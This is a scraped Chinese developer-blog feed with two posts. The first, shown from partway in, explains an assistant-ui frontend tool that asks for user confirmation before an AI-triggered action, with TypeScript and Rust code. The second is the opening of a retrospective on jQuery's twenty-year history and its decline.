  <span class="hljs-attr">amount</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"数量"</span>),
});
</code></pre>
<h4 data-id="heading-7">2. 创建前端工具</h4>
<p>这是最关键的部分，使用 <code>makeAssistantTool</code>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { makeAssistantTool } <span class="hljs-keyword">from</span> <span class="hljs-string">"@assistant-ui/react"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">CreateRecordTool</span> = <span class="hljs-title function_">makeAssistantTool</span>({
  <span class="hljs-attr">toolName</span>: <span class="hljs-string">"create-record"</span>,
  <span class="hljs-attr">type</span>: <span class="hljs-string">"frontend"</span>,  <span class="hljs-comment">// 🔑 关键：标记为前端工具</span>
  <span class="hljs-attr">parameters</span>: <span class="hljs-title class_">CreateRecordSchema</span>,
  <span class="hljs-attr">description</span>: <span class="hljs-string">"创建记录"</span>,

  <span class="hljs-comment">// execute 在前端执行</span>
  <span class="hljs-attr">execute</span>: <span class="hljs-keyword">async</span> (args, ctx) =&gt; {
    <span class="hljs-keyword">const</span> { human } = ctx;

    <span class="hljs-comment">// human() 会暂停执行，等待用户确认</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">human</span>(<span class="hljs-string">"请确认创建记录"</span>);

    <span class="hljs-keyword">if</span> (response === <span class="hljs-string">"confirmed"</span>) {
      <span class="hljs-comment">// 调用实际 API</span>
      <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">createRecord</span>(args);
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> };
    }
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span> };
  },

  <span class="hljs-comment">// render 渲染确认 UI</span>
  <span class="hljs-attr">render</span>: <span class="hljs-function">(<span class="hljs-params">{ args, status, result, resume }</span>) =&gt;</span> {
    <span class="hljs-comment">// 等待确认状态</span>
    <span class="hljs-keyword">if</span> (status.<span class="hljs-property">type</span> === <span class="hljs-string">"requires-action"</span>) {
      <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"rounded-lg border p-4"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>确认创建记录<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>名称: {args.name} | 数量: {args.amount}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> resume("confirmed")}&gt;确认<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> resume("cancelled")}&gt;取消<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
      );
    }

    <span class="hljs-comment">// 完成状态</span>
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{result?.success ? "✅" : "❌"} 已处理<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  },
});
</code></pre>
<p><strong>核心 API 解释：</strong></p>
<ul>
<li><code>human(message)</code>: 暂停执行，等待用户操作</li>
<li><code>resume(value)</code>: 用户操作后恢复执行，value 会作为 <code>human()</code> 的返回值</li>
</ul>
<h4 data-id="heading-8">3. 注册工具</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> processedToolCalls = <span class="hljs-title function_">useRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;());

  <span class="hljs-keyword">const</span> runtime = <span class="hljs-title function_">useChatRuntime</span>({
    <span class="hljs-attr">transport</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssistantChatTransport</span>({
      <span class="hljs-attr">api</span>: <span class="hljs-string">"/api/chat"</span>,
    }),
    <span class="hljs-comment">// 工具完成后自动发送结果给后端</span>
    <span class="hljs-attr">sendAutomaticallyWhen</span>: <span class="hljs-function">(<span class="hljs-params">options</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">lastAssistantMessageIsCompleteWithToolCalls</span>(options)) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      }
      <span class="hljs-keyword">const</span> lastMsg = options.<span class="hljs-property">messages</span>.<span class="hljs-title function_">at</span>(-<span class="hljs-number">1</span>);
      <span class="hljs-keyword">const</span> toolPart = lastMsg?.<span class="hljs-property">parts</span>.<span class="hljs-title function_">find</span>(
        <span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> p.<span class="hljs-property">type</span> === <span class="hljs-string">"tool-create-record"</span> &amp;&amp; p.<span class="hljs-property">state</span> === <span class="hljs-string">"output-available"</span>
      ) <span class="hljs-keyword">as</span> { <span class="hljs-attr">toolCallId</span>: <span class="hljs-built_in">string</span> } | <span class="hljs-literal">undefined</span>;

      <span class="hljs-keyword">if</span> (toolPart &amp;&amp; !processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">has</span>(toolPart.<span class="hljs-property">toolCallId</span>)) {
        processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">add</span>(toolPart.<span class="hljs-property">toolCallId</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
      }
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    },
  });

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">AssistantRuntimeProvider</span> <span class="hljs-attr">runtime</span>=<span class="hljs-string">{runtime}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Thread</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">CreateRecordTool</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">AssistantRuntimeProvider</span>&gt;</span></span>
  );
}
</code></pre>
<h4 data-id="heading-9">4. 后端接收工具定义</h4>
<p>前端会把工具定义发给后端，后端需要转发给 AI：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// Rust 后端</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">FrontendTool</span> {
    <span class="hljs-keyword">pub</span> name: <span class="hljs-type">String</span>,
    <span class="hljs-keyword">pub</span> description: <span class="hljs-type">String</span>,
    <span class="hljs-keyword">pub</span> parameters: Value,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">ToolDyn</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">FrontendTool</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> { <span class="hljs-keyword">self</span>.name.<span class="hljs-title function_ invoke__">clone</span>() }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">definition</span>(&amp;<span class="hljs-keyword">self</span>, _: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> ToolDefinition {
        ToolDefinition {
            name: <span class="hljs-keyword">self</span>.name.<span class="hljs-title function_ invoke__">clone</span>(),
            description: <span class="hljs-keyword">self</span>.description.<span class="hljs-title function_ invoke__">clone</span>(),
            parameters: <span class="hljs-keyword">self</span>.parameters.<span class="hljs-title function_ invoke__">clone</span>(),
        }
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">call</span>(&amp;<span class="hljs-keyword">self</span>, _: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">String</span>, ToolError&gt; {
        <span class="hljs-comment">// 前端工具不在后端执行！</span>
        <span class="hljs-title function_ invoke__">Err</span>(ToolError::<span class="hljs-title function_ invoke__">ToolCallError</span>(<span class="hljs-string">"Frontend tool"</span>.<span class="hljs-title function_ invoke__">into</span>()))
    }
}
</code></pre>
<h3 data-id="heading-10">完整流程</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant 用户
    participant 前端
    participant 后端
    participant AI

    用户-&gt;&gt;前端: "创建工单，数量 50"
    前端-&gt;&gt;后端: 发送消息 + 工具定义
    后端-&gt;&gt;AI: 转发
    AI-&gt;&gt;后端: 调用 create-record
    后端--&gt;&gt;前端: 返回工具调用
    前端-&gt;&gt;前端: execute() → human()
    前端-&gt;&gt;用户: 显示确认框
    用户-&gt;&gt;前端: 点击确认
    前端-&gt;&gt;前端: resume("confirmed")
    前端-&gt;&gt;后端: 发送工具结果
    后端-&gt;&gt;AI: 转发结果
    AI-&gt;&gt;后端: "好的，已记录"
    后端--&gt;&gt;前端: 返回回复
    前端-&gt;&gt;用户: 显示完成
</code></pre>
<h3 data-id="heading-11">踩坑记录</h3>
<h4 data-id="heading-12">坑 1：<code>Tool call is not waiting for human input</code></h4>
<p><strong>原因</strong>：没在 <code>execute</code> 里调用 <code>human()</code>，或者在错误状态下调用了 <code>resume()</code></p>
<p><strong>解决</strong>：确保 <code>execute</code> 里有 <code>await human()</code>，且只在 <code>status.type === "requires-action"</code> 时调用 <code>resume()</code></p>
<h4 data-id="heading-13">坑 2：工具完成后消息无限发送</h4>
<p><strong>原因</strong>：<code>sendAutomaticallyWhen</code> 对同一个工具调用重复返回 <code>true</code></p>
<p><strong>解决</strong>：用 <code>useRef</code> 记录已处理的 <code>toolCallId</code></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> processedToolCalls = <span class="hljs-title function_">useRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;());

<span class="hljs-attr">sendAutomaticallyWhen</span>: <span class="hljs-function">(<span class="hljs-params">options</span>) =&gt;</span> {
  <span class="hljs-comment">// ... 找到完成的工具调用</span>
  <span class="hljs-keyword">if</span> (!processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">has</span>(toolCallId)) {
    processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">add</span>(toolCallId);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<h4 data-id="heading-14">坑 3：用错了 <code>makeAssistantToolUI</code></h4>
<p><code>makeAssistantToolUI</code> 只渲染 UI，不会把工具定义发给后端。如果需要 AI 能调用，必须用 <code>makeAssistantTool</code>。</p>
<h3 data-id="heading-15">总结</h3>
<p>通过 <code>assistant-ui</code> 的前端工具机制，我们实现了：</p>
<ol>
<li><strong>AI 能力不打折</strong>：AI 仍然可以决定何时调用工具</li>
<li><strong>用户有控制权</strong>：敏感操作必须经过用户确认</li>
<li><strong>体验很自然</strong>：确认框嵌入在对话流中，不突兀</li>
</ol>
<p>这套方案已经在生产环境稳定运行，用户再也不用担心 AI "手滑"了 😄</p>
<hr/>
<p><strong>技术栈</strong>：React + Rust + Tauri + assistant-ui</p>
<p>如果你也在做 AI 应用，需要人机协作的场景，希望这篇文章对你有帮助！</p>
<p>欢迎评论区交流 👇</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[回首 jQuery 20 年：从辉煌到没落]]></title>    <link>https://juejin.cn/post/7597259271110246440</link>    <guid>https://juejin.cn/post/7597259271110246440</guid>    <pubDate>2026-01-20T10:53:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597259271110246440" data-draft-id="7597243334176882728" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="回首 jQuery 20 年：从辉煌到没落"/> <meta itemprop="keywords" content="前端,JavaScript,jQuery"/> <meta itemprop="datePublished" content="2026-01-20T10:53:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冴羽"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            回首 jQuery 20 年：从辉煌到没落
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冴羽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:53:20.000Z" title="Tue Jan 20 2026 10:53:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2006 年 1 月 14 日，John Resig 发布了名为 jQuery 的 JavaScript 库。</p>
<p><strong>至今已经过去了 20 年！</strong></p>
<p>20 周年之际，jQuery 4.0 正式发布了！</p>
<p>是的，就是那个被无数人宣布“已死”的 jQuery，经过 10 年的等待后迎来了重大更新。</p>
<p>更让人意想不到的是，根据 W3Techs 的数据，<strong>jQuery 仍然被全球 78% 的网站使用</strong>。</p>
<p>这个数字意味着什么？</p>
<p>在 React、Vue、Angular 等现代框架横行的今天，那个曾经被我们嫌弃“老掉牙”的 jQuery，依然在互联网的角落里默默发光发热。</p>
<p>从 2006 年 John Resig 在 BarCampNYC 大会上首次发布，到今天 4.0 版本的现代化重生，jQuery 走过了整整 20 年。</p>
<p><strong>它不仅是一个 JavaScript 库，更是一个时代的缩影，见证了前端技术从混沌到繁荣的完整历程。</strong></p>
<p>本篇让我们一起回顾 jQuery 的 20 年，见证它的辉煌与没落。</p>
<h2 data-id="heading-0">1. 混沌时代</h2>
<p>回望 2006 年，彼时正值第一次浏览器战争的尾声，微软 IE 与网景 Navigator 刚刚打完仗，但遗留下来的兼容性问题却让无数前端开发者头疼不已。</p>
<p>当时开发者需要面对各种浏览器的“奇技淫巧”，光是一个事件绑定就要写一大串兼容代码。</p>
<p>来看看这段早期的 jQuery 源码：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 如果使用Mozilla</span>
<span class="hljs-keyword">if</span> (jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"mozilla"</span> || jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"opera"</span>) {
    jQuery.<span class="hljs-property">event</span>.<span class="hljs-title function_">add</span>(<span class="hljs-variable language_">document</span>, <span class="hljs-string">"DOMContentLoaded"</span>, jQuery.<span class="hljs-property">ready</span>);
}
<span class="hljs-comment">// 如果使用IE</span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"msie"</span>) {
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">"&lt;scr"</span> +=<span class="hljs-string">""</span> <span class="hljs-string">"ipt="</span><span class="hljs-string">" id="</span>__ie_init<span class="hljs-string">" defer="</span><span class="hljs-literal">true</span><span class="hljs-string">" "</span>=<span class="hljs-string">""</span> <span class="hljs-string">"src="</span><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">void</span>(<span class="hljs-number">0</span>)<span class="hljs-string">"&gt;&lt;\/script&gt;"</span>);
    <span class="hljs-keyword">var</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"__ie_init"</span>);
    script.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">readyState</span> == <span class="hljs-string">"complete"</span>) jQuery.<span class="hljs-title function_">ready</span>();
    };
}
<span class="hljs-comment">// 如果使用Safari</span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"safari"</span>) {
    jQuery.<span class="hljs-property">safariTimer</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">readyState</span> == <span class="hljs-string">"loaded"</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">readyState</span> == <span class="hljs-string">"complete"</span>) {
            <span class="hljs-built_in">clearInterval</span>(jQuery.<span class="hljs-property">safariTimer</span>);
            jQuery.<span class="hljs-title function_">ready</span>();
        }
    }, <span class="hljs-number">10</span>);
}
&lt;/scr<span class="hljs-string">"&gt;

</span></code></pre>
<p>看到没？仅仅是处理页面加载事件就要写这么多兼容代码！这在今天是难以想象的。</p>
<h2 data-id="heading-1">2. 横空出世</h2>
<p>就在这时，jQuery 横空出世，彻底改变了游戏规则。</p>
<p>John Resig 提出了一个简单而优雅的理念：</p>
<blockquote>
<p><strong>Write Less，Do More</strong></p>
</blockquote>
<p>jQuery 通过精简常见的重复性任务，去除所有不必要的标记，使代码简洁、高效且易于理解，从而实现这一目标。</p>
<p>jQuery 带来了两大革命性改变：</p>
<ol>
<li><strong>强大的选择器引擎</strong>：不再局限于简单的 ID 和类选择，可以进行复杂的关系选择</li>
<li><strong>优雅的 API 设计</strong>：链式操作让代码既简洁又易读</li>
</ol>
<p>看看这个对比：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 传统DOM操作</span>
<span class="hljs-keyword">var</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"contacts"</span>).<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">"ul"</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">"people"</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; elements.<span class="hljs-property">length</span>; i++) {
  <span class="hljs-keyword">var</span> items = elements[i].<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">"li"</span>);
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; items.<span class="hljs-property">length</span>; j++) {
    <span class="hljs-comment">// 操作每个item</span>
  }
}

<span class="hljs-comment">// jQuery方式</span>
$(<span class="hljs-string">"#contacts ul.people li"</span>).<span class="hljs-title function_">each</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-comment">// 操作每个item</span>
});
</code></pre>
<p>差距一目了然！</p>
<p>jQuery 的出现让前端开发变得如此优雅，以至于迅速在开发者群体中传播开来。</p>
<h2 data-id="heading-2">3. 辉煌岁月</h2>
<p>随着 jQuery 的普及，一个庞大的插件生态迅速建立起来。</p>
<p>从日期选择器到轮播图，从表单验证到动画效果，几乎你能想到的功能都有对应的 jQuery 插件。</p>
<p>那时候前端开发的标准流程是：</p>
<ol>
<li>下载 jQuery 核心库</li>
<li>搜索并下载所需的 jQuery 插件</li>
<li>组合这些插件完成项目</li>
</ol>
<p>同时，jQuery 的管理也变得正式。</p>
<p>2011 年，jQuery 团队正式成立了 jQuery 理事会。2012 年，jQuery 理事会成立了 jQuery 基金会。</p>
<h2 data-id="heading-3">4. 影响深远</h2>
<p>jQuery 的影响力远远超出了技术本身，它推动了整个前端行业的发展：</p>
<ul>
<li>**大幅降低了前端开发的门槛：**让更多的开发者能够参与到前端开发中来</li>
<li><strong>提升了前端工程师的社会地位</strong>：让前端开发变得更加专业和重要</li>
<li><strong>促进了浏览器厂商的标准化</strong>：jQuery 的成功证明了统一 API 的重要性</li>
<li><strong>催生了现代前端工具链</strong>：为后来的模块化、构建工具奠定了基础</li>
</ul>
<p>甚至连 jQuery 的选择器引擎 Sizzle 后来都被提取出来，影响了整个选择器标准的发展。</p>
<h2 data-id="heading-4">5. 价值动摇</h2>
<p>jQuery 之所以能够快速普及，很大程度上是因为浏览器的“不争气”。</p>
<p>而当浏览器厂商开始认真对待标准化问题时，jQuery 的核心价值就开始动摇了。</p>
<p>2009 年后，浏览器标准化进程大幅加速：</p>
<ul>
<li><code>querySelector</code>和<code>querySelectorAll</code>的出现</li>
<li><code>classList</code> API 的普及</li>
<li><code>fetch</code> API 替代 Ajax 需求</li>
<li>CSS3 动画替代 JavaScript 动画</li>
</ul>
<p>现代浏览器 API 的完善，让很多 jQuery 功能都有了原生替代品：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// jQuery方式</span>
$(<span class="hljs-string">"#btn"</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">"click"</span>, <span class="hljs-function">() =&gt;</span> $(<span class="hljs-string">"#box"</span>).<span class="hljs-title function_">addClass</span>(<span class="hljs-string">"active"</span>));

<span class="hljs-comment">// 原生方式</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#btn"</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"click"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#box"</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">"active"</span>);
});
</code></pre>
<p>你可以发现，差距已经不再那么明显！</p>
<h2 data-id="heading-5">6. 框架打击</h2>
<p>2010 年，React、Angular、Vue 等现代框架相继登场，带来了革命性的变化：</p>
<ol>
<li><strong>组件化思维</strong>：从 DOM 操作转向组件构建</li>
<li><strong>声明式编程</strong>：描述“什么”而不是“如何”</li>
<li><strong>状态管理</strong>：解决了复杂应用的维护问题</li>
<li><strong>工具链完善</strong>：从构建到部署的完整解决方案</li>
</ol>
<p>这些框架从架构层面解决了 jQuery 时代的问题，就像从手工制作转向了工业化生产。</p>
<h2 data-id="heading-6">7. 惨遭背叛</h2>
<p>2018 年，GitHub 公开宣布从其前端移除 jQuery，这个标志性事件被广泛解读为“jQuery 时代的终结”。</p>
<p>GitHub 在博客中详细说明了迁移的理由：现代浏览器 API 已经足够完善，React 的组件化模式更适合大型应用的维护。</p>
<p>这个“背叛”对 jQuery 的声誉造成了重大打击，也加速了它在新技术栈中的衰落。</p>
<h2 data-id="heading-7">8. 瘦死骆驼</h2>
<p>尽管在技术前沿领域失势，但 jQuery 在<strong>存量市场</strong>中的地位依然稳固：</p>
<ul>
<li><strong>78% 的顶级网站</strong>仍在使用 jQuery</li>
<li><strong>WordPress 等 CMS 系统</strong>大量依赖 jQuery</li>
<li><strong>企业级应用</strong>中 jQuery 代码基数庞大</li>
</ul>
<p>为什么企业不直接抛弃 jQuery？</p>
<p>因为现实远比理想复杂：</p>
<ol>
<li><strong>业务逻辑与 DOM 深度耦合</strong>：重构成本巨大</li>
<li><strong>第三方插件依赖</strong>：很多插件没有现代替代方案</li>
<li><strong>迁移风险</strong>：新功能开发受阻，影响营收</li>
<li><strong>技能断层</strong>：团队对旧技术熟悉，对新技术陌生</li>
</ol>
<p>比如一个电商网站如果要重构支付流程的 jQuery 代码，任何 bug 都可能导致直接的经济损失。这种风险评估让很多公司望而却步。</p>
<p>此外，WordPress 支撑着全球 43% 的网站，它的核心仍然依赖 jQuery。这个庞大的生态系统意味着：</p>
<ul>
<li>数十万主题和插件依赖 jQuery</li>
<li>内容管理系统对稳定性的要求远超先进性</li>
